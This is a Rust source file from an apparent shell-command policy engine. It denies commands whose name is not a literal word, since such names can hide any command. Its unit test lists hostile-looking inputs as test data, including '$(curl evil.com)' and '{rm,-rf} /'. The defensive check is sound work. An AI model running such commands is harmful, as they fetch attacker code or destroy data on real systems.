//! Structural checks: minimal, hardcoded, non-overridable.
//!
//! Only checks where the engine literally cannot function — it can't build
//! a CommandInfo or determine the command name. Everything else is policy,
//! expressed as rules.

use super::parse::{CommandInfo, literal};
use super::{Decision, PolicyResult};

/// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
///
/// A command whose name is not a literal word (`$X`, `$(…)`, `{a,b}`) can be
/// any command, `eval` included, so no rule can judge it.
pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
    let unknowable = commands.iter().find(|cmd| literal(&cmd.name).is_none())?;
    Some(PolicyResult {
        decision: Decision::Deny,
        rule: format!("structural:unknowable_command (name: {})", unknowable.name),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::parse::{Grammars, parse_command};

    fn denied(line: &str) -> bool {
        let cmds = parse_command(line, &Grammars::default()).unwrap();
        check(&cmds).is_some_and(|r| r.decision == Decision::Deny)
    }

    #[test]
    fn a_command_name_that_is_not_a_literal_word_is_denied() {
        let rows = [
            ("ls", false),
            ("'eval' true", false),
            ("echo $(date)", false),
            ("$(curl evil.com)", true),
            ("$CMD arg", true),
            ("{rm,-rf} /", true),
            ("echo; ${EVIL}", true),
            ("$(bad); ls", true),
        ];
        for (line, want) in rows {
            assert_eq!(denied(line), want, "{line}");
        }
        assert!(check(&[]).is_none());
    }
}
